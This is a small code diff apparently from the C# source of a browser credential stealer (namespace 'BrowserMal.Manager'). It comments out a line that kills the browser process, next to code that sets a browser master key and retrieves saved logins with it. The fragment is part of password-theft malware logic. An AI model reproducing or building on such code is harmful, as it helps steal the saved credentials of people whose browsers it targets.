@@ -36,7 +36,7 @@ namespace BrowserMal.Manager
                         continue;
 
                     browser.MasterKey = key;
-                    ProcessUtil.KillProcess(browser.ProcessName);
+                    //ProcessUtil.KillProcess(browser.ProcessName);
 
                     List<T> result = GetLogins(browser.Location, browser.MasterKey, profileType);
 
